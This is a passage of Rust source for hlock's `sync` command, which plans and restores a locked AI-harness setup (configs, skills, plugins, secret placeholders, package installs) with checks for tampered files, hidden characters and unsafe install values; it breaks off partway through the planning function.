//! `hlock sync`: rehydrate a locked harness setup (SPEC §7.8.5).
//!
//! Syncing is a [`Plan`] of [`Step`]s, each `satisfied` (already true here),
//! `auto` (hlock can do it), or `manual` (it needs the user, and the step says
//! exactly what to run and why). Planning is side-effect free; [`run_step`]
//! performs one `auto` step. Package-manager installs and model downloads are
//! only `auto` when the caller opts in (`install`, `pull`); otherwise they're
//! manual steps with the command to run.

use std::collections::{BTreeMap, BTreeSet};
use std::path::{Path, PathBuf};
use std::time::Duration;

use serde::{Deserialize, Serialize};
use serde_json::{json, Value};

use crate::capture::{host_port, locate_model, read_config, render_config, tree_digest};
use crate::error::{Error, Result};
use crate::fsutil;
use crate::lockfile::{Lockfile, Native, Runtime};
use crate::process::{self, Limits};
use crate::profiles::{probe_harness, probe_runtime, python_package_versions, Ctx, HarnessProfile, Registry};
use crate::secrets;

/// Where a sync materializes the setup.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct SyncOptions {
    /// Materialize into an isolated config root under this directory (the
    /// "virtual environment" `launch` uses). Default: `.hlock/env` next to the lock.
    pub prefix: Option<PathBuf>,
    /// Write into the user's real config root (`~/.claude`, …) instead of an
    /// isolated one. Only an explicit opt-in touches global config.
    pub in_place: bool,
    /// Materialize into a Docker build context: files land under `<dir>/home`.
    pub docker: Option<PathBuf>,
    /// Let hlock run package managers (npm, brew, uv, pip, install scripts).
    pub install: bool,
    /// Let hlock download model weights through installed runtimes.
    pub pull: bool,
    /// Also fetch models a provider lists but no locked role uses.
    pub all_models: bool,
    /// Remove skills in the harness's skill directory that aren't in the lock.
    pub exact: bool,
    /// Write secrets as the harness's own environment references (profile
    /// `env-ref`) instead of their values, for a caller that passes the values in
    /// the harness's environment ([`secret_env`]). `hlock launch` sets it.
    pub inject: bool,
    /// More harnesses to install the lock's portable declared dependencies (skills, MCP
    /// servers, instruction files) into: `[target] also` in `harness.toml`.
    pub also: Vec<String>,
    /// Files whose hidden characters are let through (`--allow-hidden FILE`).
    pub allow_hidden: Vec<String>,
    /// Treat every executable the lock would run as approved (`--trust`): the caller has
    /// reviewed the lock some other way, and records the approvals.
    pub trust: bool,
}

/// One concrete thing an `auto` step does.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(tag = "type", rename_all = "kebab-case")]
pub enum Action {
    /// Restore a vendored config file (whole, or only `pointers` merged into the target).
    /// Secrets missing from the environment are taken from `path`, else from `fallback`
    /// (the user's live config, when materializing into a prefix on the same machine).
    WriteConfig {
        path: PathBuf,
        vendored: PathBuf,
        format: String,
        pointers: Vec<String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        fallback: Option<PathBuf>,
        /// Write secrets as this environment reference template instead of values.
        #[serde(default, skip_serializing_if = "Option::is_none")]
        env_ref: Option<String>,
    },
    /// Copy a vendored directory (a skill) into place.
    CopyDir { from: PathBuf, to: PathBuf },
    /// Copy a file (an instruction file) into place.
    CopyFile { from: PathBuf, to: PathBuf },
    /// Fetch a skill from git at a commit.
    GitSkill { url: String, commit: String, subpath: String, to: PathBuf, name: String, scripts: Option<Vec<String>> },
    /// Run a command.
    Run { argv: Vec<String>, env: BTreeMap<String, String> },
    /// Move a path aside to `<path>.hlock-bak`.
    Remove { path: PathBuf },
    /// Replace hlock's decider hooks in a config file with `entries` (event → groups),
    /// and set the top-level keys in `set` (Cursor's `"version": 1`).
    WriteHooks {
        path: PathBuf,
        format: String,
        pointer: String,
        entries: Value,
        #[serde(default, skip_serializing_if = "serde_json::Map::is_empty")]
        set: serde_json::Map<String, Value>,
    },
    /// Write a file hlock owns (a decider plugin, Copilot's hook file).
    WriteFile { path: PathBuf, content: String },
    /// Fetch a declared dependency at its locked commit (through the shared git cache and
    /// the project's store), check its digest, and put it in place.
    FetchDep {
        entry: Box<crate::deps::Entry>,
        to: PathBuf,
        project: PathBuf,
        /// Files whose hidden characters are let through when it's fetched.
        #[serde(default, skip_serializing_if = "Vec::is_empty")]
        allow_hidden: Vec<String>,
        /// The lock let its hidden characters through (`scan = "allowed:critical"`).
        #[serde(default, skip_serializing_if = "std::ops::Not::not")]
        allowed: bool,
    },
    /// Set one MCP server in a harness's config.
    WriteMcp { dest: crate::deps::McpDest, name: String, entry: Value },
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(default)]
pub struct Step {
    pub id: String,
    /// `harness` | `plugin` | `config` | `skill` | `instructions` | `mcp` | `runtime` | `model` | `package` | `secret`
    pub kind: String,
    pub title: String,
    /// `satisfied` | `auto` | `manual`
    pub status: String,
    /// Why it's manual, or what satisfied it.
    pub reason: String,
    pub action: Option<Action>,
    /// The command to run by hand (manual steps), or the one `action` runs.
    pub command: Option<String>,
    /// A command that confirms the step worked.
    pub verify: Option<String>,
    /// Not needed for the locked roles (e.g. extra models a provider lists).
    pub optional: bool,
    pub size_bytes: Option<u64>,
}

impl Default for Step {
    fn default() -> Self {
        Step {
            id: String::new(),
            kind: String::new(),
            title: String::new(),
            status: "satisfied".into(),
            reason: String::new(),
            action: None,
            command: None,
            verify: None,
            optional: false,
            size_bytes: None,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
#[serde(default)]
pub struct Plan {
    pub harness: String,
    pub harness_name: String,
    /// The command that starts the harness (`claude`, `pi`, …).
    pub binary: Option<String>,
    pub version: Option<String>,
    /// `home` (the user's real config), `prefix`, or `docker`.
    pub mode: String,
    /// The config root this plan writes into.
    pub root: PathBuf,
    /// Environment that points the harness at `root` (empty in `home` mode).
    pub isolation: BTreeMap<String, String>,
    /// In `prefix` mode, the directory isolated roots live under, for display
    /// (relative to the project when it's inside it).
    pub prefix: Option<String>,
    /// In `prefix` mode, this harness's own directory under the prefix, which
    /// [`ignore_env`] marks as not for version control.
    pub env: Option<PathBuf>,
    pub steps: Vec<Step>,
    /// Things to know about the plan that aren't steps (what `[target] also` leaves out).
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub notes: Vec<String>,
    /// What the lock would run here, each with its trust status (`specs/audit.md` §4).
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub executables: Vec<crate::trust::Executable>,
}

impl Plan {
    pub fn count(&self, status: &str) -> usize {
        self.steps.iter().filter(|s| s.status == status && !s.optional).count()
    }

    /// The `hlock sync` and `hlock check` commands that target the same place as this plan.
    pub fn commands(&self) -> (String, String) {
        match (self.mode.as_str(), &self.prefix) {
            ("prefix", Some(p)) => {
                let p = shell_join(std::slice::from_ref(p));
                (format!("hlock sync --prefix {p}"), format!("hlock check --prefix {p}"))
            }
            ("docker", _) => ("hlock sync --docker".into(), "hlock check".into()),
            _ => ("hlock sync --in-place".into(), "hlock check".into()),
        }
    }
}

// --------------------------------------------------------------------------- //
// Placeholders
// --------------------------------------------------------------------------- //

const PH_OPEN: &str = "${HLOCK_SECRET_";

/// Secret placeholder names in a string.
pub(crate) fn placeholders(s: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut rest = s;
    while let Some(i) = rest.find(PH_OPEN) {
        let after = &rest[i + 2..];
        match after.find('}') {
            Some(j) => {
                out.push(after[..j].to_string());
                rest = &after[j + 1..];
            }
            None => break,
        }
    }
    out
}

fn collect_placeholders(v: &Value, out: &mut BTreeSet<String>) {
    match v {
        Value::String(s) => out.extend(placeholders(s)),
        Value::Array(a) => a.iter().for_each(|x| collect_placeholders(x, out)),
        Value::Object(m) => m.values().for_each(|x| collect_placeholders(x, out)),
        _ => {}
    }
}

/// Looks a placeholder's value up ([`secrets::lookup`] in practice).
pub(crate) type Resolve<'a> = &'a dyn Fn(&str) -> Option<String>;

/// Fill placeholders from `resolve`, else keep the target's existing value
/// at the same place (so a sync never overwrites a real secret with a
/// placeholder). Returns the names still missing.
fn fill(desired: &Value, actual: Option<&Value>, resolve: Resolve, missing: &mut BTreeSet<String>) -> Value {
    match desired {
        Value::String(s) if s.contains(PH_OPEN) => {
            let mut out = s.clone();
            let mut unfilled = Vec::new();
            for name in placeholders(s) {
                match resolve(&name).filter(|v| !v.is_empty()) {
                    Some(v) => out = out.replace(&format!("${{{name}}}"), &v),
                    None => unfilled.push(name),
                }
            }
            if unfilled.is_empty() {
                return Value::String(out);
            }
            match actual.and_then(Value::as_str) {
                // a placeholder or a harness's reference to one (`{env:HLOCK_SECRET_…}`) isn't a value
                Some(a) if !a.contains(secrets::PREFIX) && !a.is_empty() => Value::String(a.to_string()),
                _ => {
                    missing.extend(unfilled);
                    Value::String(out)
                }
            }
        }
        Value::Object(m) => {
            let am = actual.and_then(Value::as_object);
            Value::Object(m.iter().map(|(k, v)| (k.clone(), fill(v, am.and_then(|a| a.get(k)), resolve, missing))).collect())
        }
        Value::Array(items) => {
            let aa = actual.and_then(Value::as_array);
            Value::Array(items.iter().enumerate().map(|(i, v)| fill(v, aa.and_then(|a| a.get(i)), resolve, missing)).collect())
        }
        other => other.clone(),
    }
}

pub(crate) fn set_pointer(root: &mut Value, ptr: &str, v: Value) {
    if ptr.is_empty() {
        *root = v;
        return;
    }
    let parts: Vec<String> = ptr.trim_start_matches('/').split('/').map(|p| p.replace("~1", "/").replace("~0", "~")).collect();
    let mut cur = root;
    for (i, part) in parts.iter().enumerate() {
        if !cur.is_object() {
            *cur = json!({});
        }
        let obj = cur.as_object_mut().expect("object");
        if i == parts.len() - 1 {
            obj.insert(part.clone(), v);
            return;
        }
        cur = obj.entry(part.clone()).or_insert_with(|| json!({}));
    }
}

/// Merge `b` under `a`: keys missing from `a` come from `b` (used to combine the
/// target's existing values with the live config's when filling secrets).
fn overlay(a: Option<Value>, b: Option<Value>) -> Option<Value> {
    match (a, b) {
        (Some(Value::Object(mut am)), Some(Value::Object(bm))) => {
            for (k, bv) in bm {
                let merged = overlay(am.remove(&k), Some(bv));
                if let Some(v) = merged {
                    am.insert(k, v);
                }
            }
            Some(Value::Object(am))
        }
        (Some(Value::String(s)), b) if s.contains(secrets::PREFIX) => b.or(Some(Value::String(s))),
        (Some(a), _) => Some(a),
        (None, b) => b,
    }
}

/// The value each single-placeholder string in `desired` took in `filled`
/// (`"Bearer ${HLOCK_SECRET_X}"` → `"Bearer abc"` gives `X = abc`).
fn extract(desired: &Value, filled: &Value, out: &mut BTreeMap<String, String>) {
    match (desired, filled) {
        (Value::String(d), Value::String(f)) => {
            if let [name] = placeholders(d).as_slice() {
                let (pre, post) = d.split_once(&format!("${{{name}}}")).unwrap_or_default();
                if !f.contains(PH_OPEN) && f.len() > pre.len() + post.len() && f.starts_with(pre) && f.ends_with(post) {
                    out.insert(name.clone(), f[pre.len()..f.len() - post.len()].to_string());
                }
            }
        }
        (Value::Object(d), Value::Object(f)) => d.iter().for_each(|(k, v)| if let Some(x) = f.get(k) { extract(v, x, out) }),
        (Value::Array(d), Value::Array(f)) => d.iter().zip(f).for_each(|(a, b)| extract(a, b, out)),
        _ => {}
    }
}

/// Placeholders rewritten as the harness's environment references.
fn to_refs(v: &Value, template: &str) -> Value {
    match v {
        Value::String(s) if s.contains(PH_OPEN) => {
            Value::String(placeholders(s).iter().fold(s.clone(), |acc, n| acc.replace(&format!("${{{n}}}"), &secrets::env_ref(template, n))))
        }
        Value::Object(m) => Value::Object(m.iter().map(|(k, x)| (k.clone(), to_refs(x, template))).collect()),
        Value::Array(a) => Value::Array(a.iter().map(|x| to_refs(x, template)).collect()),
        other => other.clone(),
    }
}

/// What a `WriteConfig` would produce.
pub(crate) struct Desired {
    pub doc: Value,
    /// Secrets with no value.
    pub missing: BTreeSet<String>,
    /// With `env_ref`: the values the references stand for, to pass in the environment.
    pub values: BTreeMap<String, String>,
    /// The file carries secrets (so it's written for its owner only).
    pub has_secrets: bool,
    /// Every secret placeholder the vendored file holds.
    pub placeholders: BTreeSet<String>,
}

/// The file contents a `WriteConfig` would produce. With `env_ref`, secrets are
/// written as references, and their values (from `resolve`, else the live config)
/// come back in `values`.
fn desired_config(vendored: &Path, format: &str, pointers: &[String], target: &Path, fallback: Option<&Path>, resolve: Resolve, env_ref: Option<&str>) -> Result<Desired> {
    let src_fmt = if pointers.is_empty() { if format == "jsonc" { "json" } else { format } } else { "json" };
    let desired = read_config(vendored, src_fmt)?.ok_or_else(|| Error::Lockfile(format!("vendored file missing: {}", vendored.display())))?;
    let actual = read_config(target, format).ok().flatten();
    let live = fallback.and_then(|f| read_config(f, format).ok().flatten());
    // a target written with references holds no values to keep
    let secrets_from = if env_ref.is_some() { live } else { overlay(actual.clone(), live) };
    let mut all = BTreeSet::new();
    collect_placeholders(&desired, &mut all);
    let mut d = Desired { doc: Value::Null, missing: BTreeSet::new(), values: BTreeMap::new(), has_secrets: !all.is_empty(), placeholders: all.clone() };
    let produce = |sub: &Value, cur: Option<&Value>, d: &mut Desired| -> Value {
        let filled = fill(sub, cur, resolve, &mut d.missing);
        match env_ref {
            Some(tpl) => {
                extract(sub, &filled, &mut d.values);
                to_refs(sub, tpl)
            }
            None => filled,
        }
    };
    if pointers.is_empty() {
        d.doc = produce(&desired, secrets_from.as_ref(), &mut d);
    } else {
        let mut out = actual.clone().filter(Value::is_object).unwrap_or_else(|| json!({}));
        for p in pointers {
            if let Some(sub) = desired.get(p) {
                let cur = secrets_from.as_ref().and_then(|a| a.pointer(p));
                let v = produce(sub, cur, &mut d);
                set_pointer(&mut out, p, v);
            }
        }
        d.doc = out;
    }
    if env_ref.is_some() {
        d.missing = all.into_iter().filter(|n| !d.values.contains_key(n)).collect();
    }
    Ok(d)
}

/// Resolve placeholders through [`secrets::lookup`] in `ctx`.
fn resolver(ctx: &Ctx) -> impl Fn(&str) -> Option<String> + '_ {
    move |n: &str| secrets::lookup(n, ctx).map(|f| f.value)
}

// --------------------------------------------------------------------------- //
// Targets
// --------------------------------------------------------------------------- //

/// The context a plan writes into, and the environment that selects it. With
/// neither `docker` nor `prefix` set, that's the user's real config (`home` mode).
pub(crate) fn target_ctx(profile: &HarnessProfile, ctx: &Ctx, opts: &SyncOptions) -> (Ctx, String, BTreeMap<String, String>) {
    let mut t = ctx.clone();
    let mut iso = BTreeMap::new();
    if let Some(dir) = &opts.docker {
        t.home = dir.join("home");
        if let Some(var) = &profile.config_root.env {
            t.env.remove(var);
        }
        return (t, "docker".into(), iso);
    }
    if let Some(prefix) = &opts.prefix {
        let base = env_dir(profile, prefix, ctx);
        let root = match &profile.config_root.suffix {
            Some(sfx) => base.join("xdg").join(sfx),
            None => base.join("config"),
        };
        match profile.isolation_env(&root) {
            Some((var, value)) => {
                t.env.insert(var.clone(), value.to_string_lossy().into_owned());
                iso.insert(var, value.to_string_lossy().into_owned());
            }
            None => {
                t.home = base.join("home");
                iso.insert("HOME".into(), t.home.to_string_lossy().into_owned());
            }
        }
        return (t, "prefix".into(), iso);
    }
    (t, "home".into(), iso)
}

/// A harness's own directory under an isolated-environment prefix.
pub(crate) fn env_dir(profile: &HarnessProfile, prefix: &Path, ctx: &Ctx) -> PathBuf {
    let base = if prefix.is_absolute() { prefix.to_path_buf() } else { ctx.cwd.join(prefix) };
    base.join(&profile.id)
}

/// Create an isolated environment directory with a `.gitignore` that keeps all of it
/// out of version control: it's restored from the lock, and holds filled-in secrets
/// and the harness's own state. An existing `.gitignore` is left alone.
pub fn ignore_env(dir: &Path) -> Result<()> {
    std::fs::create_dir_all(dir)?;
    let ignore = dir.join(".gitignore");
    if !ignore.exists() {
        std::fs::write(ignore, "# hlock's isolated harness environment, restored from the lock; not for version control\n*\n")?;
    }
    Ok(())
}

/// Expand a lock's portable path (`{root}/…`, `~/…`, relative) for a target.
fn expand(p: &str, root: &Path, t: &Ctx) -> PathBuf {
    t.expand(p, Some(root))
}

/// Why a vendored copy can't be placed: it doesn't match its digest in the lock, so it was
/// edited after it was pinned (approvals and the scan exception are keyed to that digest).
pub(crate) fn tampered(from: &Path, want: Option<&String>) -> Option<String> {
    let want = want?;
    match crate::deps::content_digest(from) {
        Ok(have) if &have == want => None,
        _ => Some(format!("its vendored copy {} doesn't match its digest in the lock: it was edited after it was pinned (hlock audit shows it)", from.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default())),
    }
}

/// Why content can't be placed: critical hidden characters the lock didn't let through
/// (`scan = "allowed:critical"`) and `--allow-hidden` doesn't cover.
fn hidden(path: &Path, label: &str, scan: Option<&str>, opts: &SyncOptions) -> Option<String> {
    if crate::audit::allowed(scan) {
        return None;
    }
    let f = crate::scan::scan_path(path, label);
    let bad: Vec<&crate::scan::Finding> = f.iter().filter(|x| x.severity == crate::scan::Severity::Critical && !crate::audit::allows(&opts.allow_hidden, x)).collect();
    let first = bad.first()?;
    Some(format!(
        "it has {} character{} that hide text from a reviewer ({}); refusing to place it. Clean it with `hlock audit --strip`, or pass --allow-hidden {}",
        bad.len(),
        if bad.len() == 1 { "" } else { "s" },
        first.label(),
        fsutil::shell_quote(&first.file)
    ))
}

/// A step hlock won't do automatically because the lock asks for something unsafe: a
/// manual step saying why. A lock may come from someone else (`hlock pull`).
fn refused(id: String, kind: &str, title: String, why: String) -> Step {
    Step { id, kind: kind.into(), title, status: "manual".into(), reason: format!("{why}; refusing to write it automatically"), ..Default::default() }
}

/// A lock's vendored path, when it's a relative path inside the lock's directory.
fn vendored_path(lock_dir: &Path, rel: &str) -> Option<PathBuf> {
    let p = lock_dir.join(rel);
    (fsutil::safe_rel(rel) && fsutil::within(lock_dir, &p)).then_some(p)
}

/// Whether `p` is strictly under one of `dirs` (never one of them itself).
fn under_any(p: &Path, dirs: &[PathBuf]) -> bool {
    let real = fsutil::resolve(p);
    dirs.iter().any(|d| {
        let d = fsutil::resolve(d);
        real.starts_with(&d) && real != d
    })
}

/// A skill's `git+<url>@<commit>#path=<subpath>` source, split.
fn split_git_source(src: &str) -> (&str, &str, &str) {
    let (url_commit, sub) = src.split_once("#path=").unwrap_or((src, ""));
    let (url, commit) = url_commit.rsplit_once('@').filter(|(u, _)| u.contains("://") || u.contains(':')).unwrap_or((url_commit, "HEAD"));
    (url, commit, sub)
}

/// Why a skill's git source can't be fetched automatically, if it can't: the URL must
/// be http(s), ssh or git (or `host:path`), the commit a hash or a plain ref, and the
/// subpath relative and inside the clone.
fn git_source_problem(url: &str, commit: &str, sub: &str) -> Option<String> {
    let scheme_ok = ["https://", "http://", "ssh://", "git://"].iter().any(|s| url.starts_with(s));
    let scp_ok = !url.contains("://") && !url.contains("::") && url.split_once(':').is_some_and(|(host, _)| !host.is_empty() && !host.contains('/'));
    if url.starts_with('-') || url.chars().any(|c| c.is_control() || c.is_whitespace()) || !(scheme_ok || scp_ok) {
        return Some(format!("refusing to fetch: {url:?} isn't an http(s), ssh or git URL"));
    }
    if !fsutil::plain_token(commit) {
        return Some(format!("refusing to fetch: the commit {commit:?} isn't a hash or plain ref"));
    }
    if !sub.is_empty() && !fsutil::safe_rel(sub) {
        return Some(format!("refusing to fetch: the path {sub:?} isn't relative to the repository"));
    }
    None
}

pub(crate) fn lock_dir_of(lock_path: &Path, ctx: &Ctx) -> PathBuf {
    match lock_path.parent().filter(|p| !p.as_os_str().is_empty()) {
        Some(p) if p.is_absolute() => p.to_path_buf(),
        Some(p) => ctx.cwd.join(p),
        None => ctx.cwd.clone(),
    }
}

/// A path for display: `~/…` under the home directory, relative under the project.
pub(crate) fn pretty(p: &Path, ctx: &Ctx) -> String {
    if let Ok(rel) = p.strip_prefix(&ctx.cwd) {
        return rel.to_string_lossy().into_owned();
    }
    if let Ok(rel) = p.strip_prefix(&ctx.home) {
        return format!("~/{}", rel.to_string_lossy());
    }
    p.to_string_lossy().into_owned()
}

pub(crate) fn shell_join(argv: &[String]) -> String {
    fsutil::shell_join(argv)
}

/// Why a package name or version from a lock can't go into an install command, if it
/// can't: each must be a [`fsutil::plain_token`] (no shell syntax, no leading `-`).
pub(crate) fn install_values_problem(package: Option<&str>, version: Option<&str>) -> Option<String> {
    [("package", package), ("version", version)]
        .into_iter()
        .find_map(|(what, v)| v.filter(|v| !fsutil::plain_token(v)).map(|v| format!("refusing to install: the {what} {v:?} has characters that aren't allowed (letters, digits and ._:/@+- only, not starting with '-')")))
}

/// The command that installs a package by method, or `None` for app/manual installs
/// (and for a package or version that isn't a plain token). A script's `{version}` is
/// substituted shell-quoted.
pub(crate) fn install_command(method: &str, package: Option<&str>, version: Option<&str>, script: Option<&str>) -> Option<Vec<String>> {
    if install_values_problem(package, version).is_some() {
        return None;
    }
    let v = |sep: &str| version.map(|v| format!("{sep}{v}")).unwrap_or_default();
    match (method, package) {
        ("npm", Some(p)) => Some(vec!["npm".into(), "install".into(), "-g".into(), format!("{p}{}", v("@"))]),
        ("brew", Some(p)) => Some(vec!["brew".into(), "install".into(), p.into()]),
        ("brew-cask", Some(p)) => Some(vec!["brew".into(), "install".into(), "--cask".into(), p.into()]),
        ("uv-tool", Some(p)) => Some(vec!["uv".into(), "tool".into(), "install".into(), format!("{p}{}", v("=="))]),
        ("pip", Some(p)) => Some(vec!["python3".into(), "-m".into(), "pip".into(), "install".into(), format!("{p}{}", v("=="))]),
        ("script", _) => script.map(|s| vec!["sh".into(), "-c".into(), s.replace("{version}", &version.map(fsutil::shell_quote).unwrap_or_default())]),
        _ => None,
    }
}

/// Split a lock `source` (`npm:pkg@1.2`, `brew-cask:claude-code@2.1`, `script@0.20`) into method and package.
fn parse_source(src: &str) -> (String, Option<String>) {
    match src.split_once(':') {
        Some((m, rest)) if !m.contains('@') => {
            let pkg = if m == "pypi" {
                rest.split("==").next().unwrap_or(rest).to_string()
            } else {
                let (scope, body) = rest.strip_prefix('@').map(|b| ("@", b)).unwrap_or(("", rest));
                format!("{scope}{}", body.split('@').next().unwrap_or(body))
            };
            (if m == "pypi" { "pip".into() } else { m.to_string() }, Some(pkg))
        }
        _ => (src.split('@').next().unwrap_or(src).to_string(), None),
    }
}

fn install_step(id: String, kind: &str, what: &str, version: Option<&str>, source: Option<&str>, profile_install: &[crate::profiles::InstallMethod], opts: &SyncOptions, verify: Option<String>, ctx: &Ctx) -> Step {
    let (method, package) = source.map(parse_source).unwrap_or_default();
    let vtxt = version.map(|v| format!(" {v}")).unwrap_or_default();
    if let Some(why) = install_values_problem(package.as_deref(), version) {
        return Step { id, kind: kind.into(), title: format!("Install {what}{vtxt}"), status: "manual".into(), reason: why, verify, ..Default::default() };
    }
    let script = profile_install.iter().find(|m| m.method == "script").and_then(|m| m.command.clone());
    let manual_hint = profile_install.iter().find(|m| m.method == method || m.method == "app" || m.method == "manual").and_then(|m| m.command.clone());
    let mut argv = install_command(&method, package.as_deref(), version, script.as_deref());
    if argv.is_none() {
        // the recorded method can't be scripted here; fall back to the profile's first scriptable one
        argv = profile_install.iter().find_map(|m| install_command(&m.method, m.package.as_deref(), version, m.command.as_deref()).filter(|a| ctx.which(&a[0]).is_some()));
    }
    let mut step = Step { id, kind: kind.into(), title: format!("Install {what}{vtxt}"), verify, ..Default::default() };
    match argv {
        Some(a) => {
            step.command = Some(if a[0] == "sh" && a.len() == 3 { a[2].clone() } else { shell_join(&a) });
            let tool_ok = ctx.which(&a[0]).is_some();
            if opts.install && tool_ok {
                step.status = "auto".into();
                step.action = Some(Action::Run { argv: a, env: BTreeMap::new() });
            } else {
                step.status = "manual".into();
                step.reason = if !tool_ok {
                    format!("needs `{}`, which isn't on PATH", a[0])
                } else {
                    "package installs run only with --install".into()
                };
                if method == "brew" || method == "brew-cask" {
                    step.reason.push_str("; Homebrew installs the current version, which may differ from the pin");
                }
            }
        }
        None => {
            step.status = "manual".into();
            step.command = manual_hint;
            step.reason = format!("{what} is installed by hand");
        }
    }
    step
}

// --------------------------------------------------------------------------- //
// Planning
// --------------------------------------------------------------------------- //

/// Build the sync plan for a lock. Nothing is changed.
pub fn plan(lock: &Lockfile, lock_path: &Path, reg: &Registry, ctx: &Ctx, opts: &SyncOptions) -> Result<Plan> {
    let profile = reg.require_harness(&lock.harness.name)?;
    let opts = &isolated(opts, lock_path, ctx);
    let (t, mode, isolation) = target_ctx(profile, ctx, opts);
    let root = profile.config_root(&t);
    let prefix = opts.prefix.as_ref().filter(|_| mode == "prefix").map(|p| pretty(&if p.is_absolute() { p.clone() } else { ctx.cwd.join(p) }, ctx));
    let env = opts.prefix.as_ref().filter(|_| mode == "prefix").map(|p| env_dir(profile, p, ctx));
    let (sync_cmd, _) = Plan { mode: mode.clone(), prefix: prefix.clone(), ..Default::default() }.commands();
    let lock_dir = lock_dir_of(lock_path, ctx);
    let docker = mode == "docker";
    let mut steps: Vec<Step> = Vec::new();
    let mut missing_secrets: BTreeSet<String> = BTreeSet::new();
    let mut all_secrets: BTreeSet<String> = BTreeSet::new();

    // ---- harness ----
    if profile.kind == "cli" && !docker {
        let probe = probe_harness(profile, ctx);
        let want = lock.harness.version.as_deref();
        let bin = profile.binaries.first().cloned().unwrap_or_default();
        let verify = Some(format!("{bin} {}", profile.version.args.join(" ")));
        let matches = probe.installed && (want.is_none() || probe.version.as_deref() == want);
        if matches {
            steps.push(Step {
                id: "harness".into(),
                kind: "harness".into(),
                title: format!("{} {}", profile.name, probe.version.clone().unwrap_or_default()),
                reason: "installed".into(),
                ..Default::default()
            });
        } else {
            let mut s = install_step("harness".into(), "harness", &profile.name, want, lock.harness.source.as_deref(), &profile.install, opts, verify, ctx);
            if probe.installed {
                s.title = format!("Install {} {} (found {})", profile.name, want.unwrap_or("?"), probe.version.unwrap_or_else(|| "?".into()));
            }
            steps.push(s);
        }
    }

    // ---- plugins and packages ----
    let harness_env = isolation.clone();
    for n in &lock.native {
        if let Some(mut s) = native_step(n, profile, &t, &root, harness_env.clone(), opts, ctx) {
            // a plugin runs code: from someone else's lock, install it only when asked
            if lock.pulled.is_some() && !opts.install && s.status == "auto" {
                s.status = "manual".into();
                s.reason = "the lock was pulled from someone else; plugin installs run only with --install".into();
                s.action = None;
            }
            steps.push(s);
        }
    }

    // ---- config files ----
    for c in &lock.config {
        let Some(target) = profile.file_path(&c.id, &t) else { continue };
        let display = pretty(&target, ctx);
        let Some(vend) = &c.vendored else {
            if c.restore == "record" {
                let ok = std::fs::read(&target).map(|b| Some(crate::hash::sha256_bytes(&b)) == c.digest).unwrap_or(false);
                steps.push(Step {
                    id: format!("config:{}", c.id),
                    kind: "config".into(),
                    title: format!("Check {}", c.path),
                    status: if ok { "satisfied" } else { "manual" }.into(),
                    reason: if ok { "matches the lock".into() } else { "project file differs from the lock; it comes from the repo, so update it there".into() },
                    optional: !ok,
                    ..Default::default()
                });
            }
            continue;
        };
        let Some(vendored) = vendored_path(&lock_dir, vend) else {
            steps.push(refused(format!("config:{}", c.id), "config", format!("Restore {}", c.path), format!("its vendored copy {vend:?} isn't a path inside the lock's directory")));
            continue;
        };
        // a file the profile restores by pointer is only written at those pointers: a lock
        // can't widen that to the whole file, or to keys the profile doesn't name
        if let Some(spec) = profile.files.get(&c.id).filter(|f| f.restore == "pointers") {
            let stray: Vec<&String> = c.pointers.iter().filter(|p| !spec.pointers.iter().any(|q| p == &q || p.starts_with(&format!("{q}/")))).collect();
            if c.pointers.is_empty() || !stray.is_empty() {
                let what = if c.pointers.is_empty() { "the whole file".to_string() } else { stray.iter().map(|s| s.as_str()).collect::<Vec<_>>().join(", ") };
                steps.push(refused(format!("config:{}", c.id), "config", format!("Restore {}", c.path), format!("the lock restores {what}, but {} restores only {} of this file", profile.name, spec.pointers.join(", "))));
                continue;
            }
        }
        let fmt = if c.pointers.is_empty() { if c.format == "jsonc" { "json" } else { c.format.as_str() } } else { "json" };
        let edited = c.digest.as_ref().is_some_and(|want| read_config(&vendored, fmt).ok().flatten().is_none_or(|d| &crate::hash::content_hash(&d) != want));
        let edited = edited.then(|| format!("its vendored copy {vend} doesn't match its digest in the lock: it was edited after it was pinned (hlock audit shows it)"));
        if let Some(why) = edited.or_else(|| hidden(&vendored, vend, c.scan.as_deref(), opts)) {
            steps.push(Step { id: format!("config:{}", c.id), kind: "config".into(), title: format!("Restore {}", c.path), status: "manual".into(), reason: why, ..Default::default() });
            continue;
        }
        let fallback = (mode == "prefix").then(|| profile.file_path(&c.id, ctx)).flatten();
        let env_ref = opts.inject.then(|| profile.files.get(&c.id).and_then(|f| f.env_ref.clone())).flatten();
        let resolve = resolver(ctx);
        let Desired { doc: desired, missing, placeholders, .. } = desired_config(&vendored, &c.format, &c.pointers, &target, fallback.as_deref(), &resolve, env_ref.as_deref())?;
        all_secrets.extend(placeholders);
        missing_secrets.extend(missing.iter().cloned());
        // hlock's decider hooks are written by their own step, so they aren't drift here
        let actual = read_config(&target, &c.format).ok().flatten().map(|mut a| {
            crate::decide::strip_hooks(&mut a);
            a
        });
        let same = match (&actual, c.pointers.is_empty()) {
            (Some(a), true) => a == &desired,
            (Some(a), false) => c.pointers.iter().all(|p| a.pointer(p) == desired.pointer(p)),
            (None, _) => false,
        };
        let what = if c.pointers.is_empty() { display.clone() } else { format!("{} {}", display, c.pointers.join(",")) };
        let step_id = if c.pointers.is_empty() { format!("config:{}", c.id) } else { format!("config:{}#{}", c.id, c.pointers.join(",")) };
        steps.push(Step {
            id: step_id,
            kind: "config".into(),
            title: if same { what } else if actual.is_some() { format!("Update {what}") } else { format!("Write {what}") },
            status: if same { "satisfied" } else { "auto" }.into(),
            reason: if same { "matches the lock".into() } else if actual.is_some() { "the current file is kept as .hlock-bak".into() } else { String::new() },
            action: (!same).then(|| Action::WriteConfig { path: target.clone(), vendored, format: c.format.clone(), pointers: c.pointers.clone(), fallback, env_ref }),
            ..Default::default()
        });
    }

    // ---- skills ----
    let write_dir = profile.skills.write.as_ref().map(|w| expand(w, &root, &t));
    // where a lock may put a skill: under the harness's skill directories
    let skill_dirs: Vec<PathBuf> = write_dir.iter().cloned().chain(profile.skills.dirs.iter().map(|d| expand(d, &root, &t))).collect();
    let mut locked_skill_dirs = BTreeSet::new();
    for s in &lock.skill {
